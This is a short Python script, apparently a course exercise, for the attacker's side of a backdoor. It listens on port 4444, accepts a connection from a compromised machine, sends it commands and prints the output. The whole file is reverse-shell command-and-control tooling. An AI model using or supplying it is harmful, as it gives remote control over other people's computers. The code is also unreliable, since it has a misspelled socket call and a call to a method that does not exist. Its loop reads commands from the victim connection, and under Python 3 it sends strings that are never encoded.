#!/usr/bin/python3

import socket, json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsocketopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, 4444)) 
        listener.listen(0) 
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept() #captured 2 values that get returned (connection and addr)
        print("[+] Got a connection from " + str(address)) #tells me i have a connection

    def reliable_send(self, data):
        json_data = json.dumps(data) #data converted to json object
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024) 
                return json.loads(json_data) #unwrap json data and return it to me
            except ValueError: #try to convert back to original or restart
                continue
        
    def execute_remotely(self, command):
        self.connection.send(command) #command is sent to the back door
        return self.connection.recv(1024)#back door gives us the result

    def run(self):
        while True: #infinite loop
            command = self.reliable_recieve()
            result = self.execute_remotely(command)
            print(result) #prints result onto my computer
        
my_listener = Listener("10.0.2.10", 4444) 
my_listener.run()
